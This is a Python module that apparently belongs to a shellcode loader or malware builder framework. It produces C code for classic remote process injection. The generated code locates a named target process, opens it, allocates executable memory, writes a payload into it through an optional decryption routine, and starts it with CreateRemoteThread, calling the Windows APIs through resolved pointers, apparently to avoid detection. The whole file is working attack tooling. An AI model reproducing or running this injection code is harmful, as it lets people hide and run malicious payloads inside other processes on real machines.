from code_templates import headers
from code_templates import winapi

def classic(target, decryptionRoutine, payloadVariableName, payloadLengthVariableName):
    requiredHeaders = []
    requiredHeaders.append(headers.TLHELP32_H)
    requiredHeaders.append(headers.SKERNEL32)

    requiredWinApis = []
    requiredWinApis.append(winapi.VIRTUALALLOCEX)
    requiredWinApis.append(winapi.WRITEPROCESSMEMORY)
    requiredWinApis.append(winapi.CREATEREMOTETHREAD)
    requiredWinApis.append(winapi.OPEN_PROCESS)
    requiredWinApis.append(winapi.CLOSE_HANDLE)
    requiredWinApis.append(winapi.WAIT_FOR_SINGLE_OBJECT)

    codeBase =  """
int FindTarget(const char *procname) {{

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {{
        CloseHandle_p(hProcSnap);
        return 0;
    }}
            
    while (Process32Next(hProcSnap, &pe32)) {{
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {{
                pid = pe32.th32ProcessID;
                break;
        }}
    }}
            
    CloseHandle_p(hProcSnap);
            
    return pid;
}}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    {decryptionRoutine}    
    pRemoteCode = VirtualAllocEx_p(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory_p(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
    
    hThread = CreateRemoteThread_p(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {{
            WaitForSingleObject_p(hThread, 500);
            CloseHandle_p(hThread);
            return 0;
    }}

    return -1;
}}
    """.format(decryptionRoutine = decryptionRoutine)

    main = """
    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget("{target}");

    if (pid) {{
        hProc = OpenProcess_p( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);

        if (hProc != NULL) {{
            Inject(hProc, {payloadVariableName}, {payloadLengthVariableName});
            CloseHandle_p(hProc);
        }}
    }}
    """.format(
        target = target,
        payloadVariableName = payloadVariableName,
        payloadLengthVariableName = payloadLengthVariableName

    )

    return requiredHeaders, requiredWinApis, codeBase, main